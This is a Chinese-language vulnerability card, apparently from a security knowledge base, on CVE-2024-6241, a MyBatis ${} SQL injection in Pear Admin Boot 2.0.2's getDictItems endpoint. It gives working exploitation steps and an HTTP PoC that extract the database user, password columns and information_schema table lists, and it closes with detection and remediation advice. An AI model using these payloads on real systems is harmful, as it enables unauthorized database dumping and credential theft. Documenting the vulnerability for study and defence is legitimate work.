---
id: web-java-framework-pear-admin-boot-getdictitems-table-text-code-sqli
title: Pear Admin Boot 2.0.2 /system/dictData/getDictItems/{dictCode}：三段式 dictCode 直入 ${table}/${text}/${code}，无 WHERE 也能回显 user()（CVE-2024-6241）
type: scenario
domain: web
path: web/java/framework
technique: pear-admin-boot-getdictitems-mybatis-dollar-sqli
tags:
- java
- spring-boot
- mybatis
- sqli
- pear-admin
- dict
- dollar-substitution
- cve-2024-6241
cve:
- CVE-2024-6241
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
affected_versions: Pear Admin Boot 2.0.2（原文标题标注；CVE-2024-6241）
verification:
  verified_by: verifier-T2-3
  verified_at: '2026-11-08T00:20:08+08:00'
  notes: '已对照原文与 5 张图核对：mapper 三条语句(图01)含 select ${text} as data_label, ${code} as data_value from ${table}；service 纯转发(图03)；controller 用 GetMapping /getDictItems/{dictCode}、split 逗号、params.length==3 走 queryTableDictItemsByCode、==4 走 queryTableDictItemsByCodeAndFilter(图04)；浏览器直接访问 sys_user,user(),1 返回 dataLabel=admin@localhost 多行(图05)。已修正：原文与图04 显示控制器切段后调用 SqlInjectionUtil.filterContent(params[0..2])，卡片原写「全链路无任何过滤」有误，改为黑名单式过滤且该 payload 未触发拦截，并相应调整一句话结论与触发条件表述。affected_versions 保留 Pear Admin Boot 2.0.2(原文标题标注，未猜区间)。dedup: 唯一 duplicate 命中为卡片自身，JeecgBoot 字典两卡仅 related(cosine 0.84/0.86，产品与注入结构不同)。未验证点：未在本机复跑 PoC、filterContent 黑名单具体规则未验证。'
url: /docs/web/java/framework/web-java-framework-pear-admin-boot-getdictitems-table-text-code-sqli/
draft: false
kb_aliases:
- CVE-2024-6241
- Pear Admin Boot SQL注入
- getDictItems 注入
- dictCode 三段式
- SysDictDataMapper queryTableDictItemsByCode
- ${table} ${text} ${code}
- Pear Admin Boot 2.0.2 SQLi
---

## 一句话结论

Pear Admin Boot 2.0.2 的字典接口 `/system/dictData/getDictItems/{dictCode}` 把 `dictCode` 按逗号切成 `table,text,code` 三段，原样交给 MyBatis mapper `queryTableDictItemsByCode`，而该语句是 `select ${text} as "data_label", ${code} as "data_value" from ${table}`——三个位置全是美元符拼接，且**没有 WHERE 子句**，所以访问 `getDictItems/sys_user,user(),1` 就能让数据库把 `user()` 的结果当成列内容返回，直接看到当前数据库账号（admin@localhost），无须盲注、无须构造 WHERE。注意控制器在切分后确实调用了 `SqlInjectionUtil.filterContent()`（黑名单式字符过滤，见原理），只是该黑名单没有拦下原文这条 payload。

## 原理

- **入口**：`SysDictDataController` 的 `@GetMapping("/getDictItems/{dictCode}")` 取路径变量 `dictCode`，若含逗号则 `split(",")`；先把前三段交给 `SqlInjectionUtil.filterContent({params[0],params[1],params[2]})`，再按段数分派：长度为 4 时额外 `specialFilterContent(params[3])` 并走 `queryTableDictItemsByCodeAndFilter`，长度为 3 时走 `queryTableDictItemsByCode`，长度 <3 直接返回「字典Code格式不正确」；不含逗号时按普通字典 code 走 `selectByCode`。`SysDictDataServiceImpl.queryTableDictItemsByCode(table,text,code)` 只是转发到 mapper。
- **过滤为何不够**：`SqlInjectionUtil.filterContent()` 是字符/关键字黑名单式过滤，作用对象只是前三个参数且不改变「标识符位置仍由外部输入决定」这一事实；原文 payload `sys_user,user(),1` 没有触碰被拦的字符，所以照原样进入mapper（图04 可见调用位置）。这是「黑名单不覆盖标识符语义」的典型案例，而不是无过滤。
- **sink**：`SysDictDataMapper.xml` 里
  `select ${text} as "data_label", ${code} as "data_value" from ${table}`。
  MyBatis 的 `${}` 是字符串直接替换（区别于安全的 `#{}` 预编译占位符），三个参数分别落在 SELECT 列表与 FROM 子句。
- **为什么连 `user()` 都能直接出**：注入点在结果集列表达式而不是 WHERE 条件，因此不需要构造布尔 oracle 或时间盲注——只要表达式本身能求值并被查出，就会随行返回。`select sys_user, user(), 1 from sys_user` 里第二列就是 `user()` 的返回值，趋势是「有几行就返回几次」。
- **为什么未授权/后台都能打**：该接口在字典数据管理模块下，原文环境在浏览器直接访问 `http://localhost:8088/system/dictData/getDictItems/sys_user,user(),1`（截图地址栏无会话上下文）即返回全量数据，说明当时该路由未做严格鉴权（或攻击者已有低权会话）；无论哪种，这条 payload 都不需要额外绕过 `filterContent` 黑名单。
- **危害上限**：`${text}`/`${code}` 位置可直接放任意 MySQL 表达式/子查询（如 `(select group_concat(password) from sys_user)`），`${table}` 位置可指任意表（含 `information_schema`），因此该接口等价于「以应用数据库账号执行受限 SELECT」，可直接拖库。

## 触发条件

- 目标为 Pear Admin Boot 2.0.2（受影响版本标注为 2.0.2；CVE-2024-6241）。
- 字典接口路由 `/system/dictData/getDictItems/{dictCode}` 可达（未授权或持有任意有效会话）。
- `dictCode` 中至少含两个逗号（三段），因为控制器按 `,` 拆分后要求 `params.length >= 3`，长度为 3 时走 `queryTableDictItemsByCode`；四段时走带 `filterSql` 的另一条语句。
- 数据库为 MySQL（`user()` 等函数语义）。
- 目标表 `sys_user`（或任意可访问表）存在，字段名正确。

## 利用步骤

1. 确认路由与拆分规则：访问 `GET /system/dictData/getDictItems/sys_user,username,id`，正常返回字典项即说明三段式生效。
2. 把 `text` 位置换成 MySQL 函数：`GET /system/dictData/getDictItems/sys_user,user(),1`，响应 JSON 的 `dataLabel` 字段出现 `admin@localhost`，确认注入。
3. 用 `text` 位读取任意列：`getDictItems/sys_user,concat(username,0x3a,password),id`（注意 URL 编码逗号以外的特殊字符）。
4. 用 `code` 位或子查询读取其它表：`getDictItems/sys_user,(select group_concat(table_name) from information_schema.tables where table_schema=database()),1`。
5. 若三段式被限制，可尝试四段式 `table,text,code,filterSql`（走 `queryTableDictItemsByCodeAndFilter`，需要自行构造合法 WHERE），或换用其它 `${}` 语句（`queryTableDictByKeys` 等）。

## PoC

```http
GET /system/dictData/getDictItems/sys_user,user(),1 HTTP/1.1
Host: target:8088
```

响应（截取 `dataLabel` 字段，原文截图）：

```json
{"success":true,"code":0,"msg":null,"data":[
  {"dataLabel":"admin@localhost","dataValue":"1","typeCode":null,...},
  {"dataLabel":"admin@localhost","dataValue":"1","typeCode":null,...}
]}
```

对应被拼接的 SQL（按 mapper 原文还原）：

```sql
select sys_user as "data_label", user() as "data_value" from sys_user
```

返回行数等于 `sys_user` 表行数，说明 `user()` 作为列表达式逐行求值。

PoC 未在本机执行。

## 变体与关联

- **四段式（带 filterSql）**：`queryTableDictItemsByCodeAndFilter` 的形式是 `select ${text}, ${code} from ${table}` + `<if>where ${filterSql}</if>`，当 `dictCode` 为四段时走这条；可控面从三段扩展到含 WHERE 的任意 SQL 片段。
- **其它同族语句**：同一 mapper 里还有 `queryTableDictByKeys`（`select ${text} as "data_label", ${code} as "data_value" from ${table} where ${code} in (...)`）等，凡是 `${}` 拼接且参数来源可达 HTTP 的都属同类 sink。
- **注入位置差异**：本卡的注入在 SELECT 列表/FROM，不需要布尔盲注；若某版本加了列校验而只留 WHERE 可控，则退化为布尔/时间盲注（可参考 JeecgBoot 字典接口的同类打法）。
- **关联**：[[web-java-framework-jeecgboot-dict-filter-sql-injection]]（同为 Spring Boot 后台字典接口 `${}` 注入，但那条是四段式 filterSql + 黑名单绕过）、[[web-java-framework-jeecgboot-api-dict-waf-regex-sqli]]（同接口的 WAF 正则与黑名单不对称）、[[web-java-framework-jeecgboot-dict-blacklist-bypass-sqli]]（同族绕过手法）。
- **边界**：接口被鉴权要求拦截且攻击者无会话时不可达；若该版本已对 `table/text/code` 做白名单（只允许已知表与列名）则不成立；数据库若非 MySQL，`user()` 等函数需换成对应表达式。

## 检测与防御

- **修复**：`table`/`text`/`code` 必须走 `#{}` 或强白名单（只允许预置字典表与列名映射，禁止传入任意标识符）；CVE-2024-6241 的修复即收紧该接口的参数校验与权限。
- **鉴权**：字典数据管理接口必须要求管理员权限，不能匿名访问；对 `/system/dictData/**` 做统一鉴权与审计。
- **检测信号**：请求路径 `/system/dictData/getDictItems/` 后出现 `user()`、`@@version`、`concat(`、`select`、`information_schema`、括号与逗号异常组合；响应 `dataLabel` 出现数据库账号、版本串等非业务字典值；同一 IP 对该接口高频枚举不同 `dictCode`。
- **加固**：应用数据库账号最小权限（只读业务库、禁止跨库 `information_schema` 全量读取的意义有限但要限制高价值库）、SQL 审计与查询白名单。
